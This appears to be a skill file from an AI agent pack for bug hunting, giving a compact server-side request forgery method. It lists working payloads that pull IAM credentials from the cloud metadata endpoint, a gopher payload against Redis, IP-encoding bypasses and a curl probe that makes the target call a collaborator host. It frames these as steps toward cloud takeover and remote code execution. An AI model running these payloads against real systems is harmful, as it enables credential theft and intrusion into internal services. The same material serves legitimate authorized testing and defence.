---
skill: ssrf
title: "SSRF"
category: "Security · Web Exploitation"
load_when: "Any server-side fetch — url params, webhooks, importers, PDF/img generators, SSO metadata."
pack: SUPERAGENT V10
bughunt: true
---
# SSRF

## Where it pays
Pivot internal + cloud metadata → IAM → infra. Often critical.

## Attack-surface signals
url=/image_url=/callback=/webhook=/feed=; converters; headless renders; SSO metadata_url.

## Methodology
1. Point at a collaborator → confirm OOB.
2. Target 127.0.0.1, 169.254.169.254, metadata.google.internal.
3. Schemes: file:// gopher:// dict://.
4. Bypass: decimal/hex/octal IP, [::], rebinding, @-tricks, redirects.

## Payloads
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
gopher://127.0.0.1:6379/_<cmd>
http://0x7f000001/
```
More: `../payloads/ssrf.txt`.

## Root causes
Fetch of user URL without allowlist · follows redirects internal · parser resolves entities · trusts webhook dest.

## Bypasses
Alt IP encodings · DNS rebinding · open-redirect chain · IPv6 · uppercase scheme.

## 🧪 Try it locally (hands-on)
```bash
python3 ../../../tools/skill_router.py "ssrf via webhook url param"

# Confirm OOB first (interactsh/collaborator), then probe internal/metadata
#   payloads: ../payloads/ssrf.txt   (e.g. http://169.254.169.254/latest/meta-data/)
curl -s "$TARGET/fetch?url=http://YOUR-COLLAB/" # expect an OOB hit from target IP
```
## Validation gate
Prove you reached something internal/unroutable (OOB from target IP, metadata response).

## Impact & chains
metadata → **cloud/IAM takeover** · internal panels · gopher→Redis/DB → **RCE**.

**→ next on hit: `../phases/04-chain.md`. Payloads in `../payloads/`.**
